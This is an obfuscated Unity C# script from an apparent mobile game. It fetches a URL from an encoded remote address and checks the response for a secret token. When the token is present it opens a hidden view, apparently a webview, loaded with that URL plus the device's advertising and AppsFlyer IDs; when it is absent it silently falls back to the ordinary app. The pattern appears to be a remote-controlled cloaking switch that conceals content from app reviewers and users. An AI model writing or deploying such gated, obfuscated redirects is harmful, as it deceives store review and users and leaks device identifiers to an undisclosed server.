using System.Collections;
using System.Collections.Generic;
using AppsFlyerSDK;
using Codes.John.Game;
using Codes.John.uiPoor;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

namespace Codes.John.Steave
{
    public class cwqfluzt : MonoBehaviour
    {
        [SerializeField] private egxaacqd cdaoglxi;

        [SerializeField] private IDFAController qhmiosfm;

        [SerializeField] private Zcwiwxpj zcwiwxpj;

        private bool yzjcrhoq = true;
        private NetworkReachability nosqfrea = NetworkReachability.NotReachable;

        private string globalLocator1 { get; set; }
        private string wpzowtot;
        private int hvfhrhgt;

        private string fblqbslp;

        [SerializeField] private List<string> ichturRdiVehDoicList;
        [SerializeField] private List<string> jsfjaoppsdllList;

        private string depfbipm;

        private void Awake()
        {
            hkxnnnyy();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            qhmiosfm.ScrutinizeIDFA();
            StartCoroutine(rhbhpkfi());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    vbfdtygx();
                    break;
                default:
                    xrlitjpu();
                    break;
            }
        }

        private void hkxnnnyy()
        {
            switch (yzjcrhoq)
            {
                case true:
                    yzjcrhoq = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private IEnumerator rhbhpkfi()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            fblqbslp = qhmiosfm.RetrieveAdvertisingID();
            yield return null;
        }

        private void xrlitjpu()
        {
            if (PlayerPrefs.GetString("qqqw", string.Empty) != string.Empty)
            {
                ehaynzsx();
            }
            else
            {
                phkoalwf();
            }
        }

        private void ehaynzsx()
        {
            globalLocator1 = PlayerPrefs.GetString("qqqw", string.Empty);
            wpzowtot = PlayerPrefs.GetString("qqqw3", string.Empty);
            hvfhrhgt = PlayerPrefs.GetInt("qqqw5", 0);
            dhslqizt();
        }

        private void phkoalwf()
        {
            Invoke(nameof(jwwapyqk), 5f);
        }

        private void jwwapyqk()
        {
            if (Application.internetReachability == nosqfrea)
            {
                vbfdtygx();
            }
            else
            {
                StartCoroutine(mezmrfxi());
            }
        }


        private IEnumerator mezmrfxi()
        {
            using UnityWebRequest webRequest = UnityWebRequest.Get(zcwiwxpj.wldkakd(jsfjaoppsdllList));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                vbfdtygx();
            }
            else
            {
                crxojmoq(webRequest);
            }
        }

        private void crxojmoq(UnityWebRequest webRequest)
        {
            string tokenConcatenation = zcwiwxpj.wldkakd(ichturRdiVehDoicList);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("qqqw", dataParts[0]);
                    PlayerPrefs.SetString("qqqw3", dataParts[1]);
                    PlayerPrefs.SetInt("qqqw5", int.Parse(dataParts[2]));

                    globalLocator1 = dataParts[0];
                    wpzowtot = dataParts[1];
                    hvfhrhgt = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("qqqw", webRequest.downloadHandler.text);
                    globalLocator1 = webRequest.downloadHandler.text;
                }

                dhslqizt();
            }
            else
            {
                vbfdtygx();
            }
        }

        private void dhslqizt()
        {
            cdaoglxi.Qlkfjzsd = $"{globalLocator1}?idfa={fblqbslp}";
            cdaoglxi.Qlkfjzsd +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("PPoooollss", string.Empty)}";
            cdaoglxi.ucwuqprp = wpzowtot;


            alzvdknt();
        }

        public void alzvdknt()
        {
            cdaoglxi.efoewbvs = hvfhrhgt;
            cdaoglxi.gameObject.SetActive(true);
        }

        private void vbfdtygx()
        {
            hpllaloe();
        }

        private void hpllaloe()
        {
            CanvasHelper.FadeCanvasGroup(gameObject, false);
        }
    }
}